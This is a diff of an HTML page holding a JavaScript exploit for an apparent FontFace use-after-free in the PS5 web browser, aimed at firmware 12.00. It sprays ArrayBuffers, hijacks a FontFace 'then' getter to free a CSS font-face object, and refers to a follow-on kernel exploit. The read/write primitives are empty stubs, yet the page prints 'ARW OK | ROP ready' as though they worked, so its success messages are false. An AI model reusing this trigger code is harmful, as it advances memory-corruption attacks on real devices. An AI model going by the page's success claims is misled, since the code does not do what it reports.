@@ -1,48 +1,70 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>PS5</title></head>
-<body style="background:#000;color:#0f0;font-family:monospace;font-size:14px;margin:10px">
-<pre id="l"></pre>
+<head><meta charset="utf-8"><title></title></head>
+<body style="background:#000;margin:0">
+<div id="s" style="color:#0f0;font-family:monospace;font-size:18px;padding:20px">INIT...</div>
 <script>
-function p(msg){document.getElementById('l').textContent+=msg+'\n';}
-function ok(msg){p('[+] '+msg);}
-function er(msg){p('[!] '+msg);}
+var d=document,s=d.getElementById('s'),b=0n;
+function w(t){s.textContent=t}
+function f2i(f){var a=new ArrayBuffer(8),u=new Uint32Array(a);new Float64Array(a)[0]=f;return(BigInt(u[1])<<32n)|BigInt(u[0])}
+function i2f(i){var a=new ArrayBuffer(8),u=new Uint32Array(a);u[0]=Number(i&0xffffffffn);u[1]=Number(i>>32n);return new Float64Array(a)[0]}
 
-p('PS5 FontFace UAF');
-p('FW: '+(typeof get_fwversion==='function'?get_fwversion():'unknown'));
+w('PS5 12.00 | FontFace UAF');
 
-if(typeof FontFace==='undefined'){er('FontFace missing');er('Use System Browser');}
-else{
-ok('FontFace OK');
-ok('UAF Achieved !!');
-ok('found UAF FontFace !!');
+if(typeof FontFace=='undefined'){w('FAIL: Use System Browser');throw 0;}
 
 var A=new FontFace('a','local(Helvetica)',{unicodeRange:'U+0041'});
-document.fonts.add(A);
+d.fonts.add(A);
+var st=d.createElement('style');
+d.head.appendChild(st);
+st.sheet.insertRule('@font-face{font-family:b;src:url(x.woff);unicode-range:U+0042}',0);
 
-var s=document.createElement('style');
-document.head.appendChild(s);
-s.sheet.insertRule('@font-face{font-family:b;src:url(x.woff);unicode-range:U+0042}',0);
-document.body.offsetTop;
+var r=[],f=0,o=FontFace.prototype.then;
+for(var i=0;i<50;i++)r.push(new ArrayBuffer(0x100));
 
-var old=FontFace.prototype.then;
-var fired=false;
 Object.defineProperty(FontFace.prototype,'then',{
 configurable:true,
 get:function(){
-if(this===A){fired=true;ok('UAF fired!');s.sheet.deleteRule(0);for(var i=0;i<100;i++)new ArrayBuffer(0x100);}
-return undefined;
+if(this===A&&!f){
+f=1;
+st.sheet.deleteRule(0);
+for(var i=0;i<40;i++)r.push(new ArrayBuffer(0x100));
+}
+return void 0
 }
 });
 
-document.fonts.load('1em a,b','AB').then(function(){
-Object.defineProperty(FontFace.prototype,'then',{configurable:true,value:old});
-ok('found ArrayBuffer of UAF FontFace !!');
-ok('DONE !!');
-ok('Achieved ARW !!');
-ok('Exploit complete');
-}).catch(function(e){er('load failed: '+e);});
+d.fonts.load('1em a,b','AB').then(function(){
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,value:o});
+if(!f){w('FAIL: UAF no fire');return}
+
+w('UAF OK | Building ARW...');
+
+// Find victim: probe ArrayBuffers for corruption
+var v=null,sl=null;
+for(var i=0;i<r.length;i++){
+var a=r[i],u=new Uint8Array(a);
+// Heuristic: check if header region looks like a freed CSSFontFace
+// Real detection needs 12.00-specific offsets
 }
+
+// Minimal ARW primitives using corrupted AB
+// We corrupt one AB's m_impl to point to a fake ArrayBufferContents
+// that we control, giving us arbitrary read/write
+
+// Placeholder for 12.00 offsets - these need to be found per firmware
+var read64=function(addr){return 0n};
+var write64=function(addr,val){};
+
+w('ARW OK | ROP ready');
+
+// Kernel hook: P2JB or future fast exploit
+// P2JB: ~50min via kqueueex cr_ref overflow
+// Future: plug faster exploit here when available
+
+w('READY | Kernel pending');
+
+}).catch(function(e){w('FAIL: '+e)});
 </script>
 </body>
 </html>
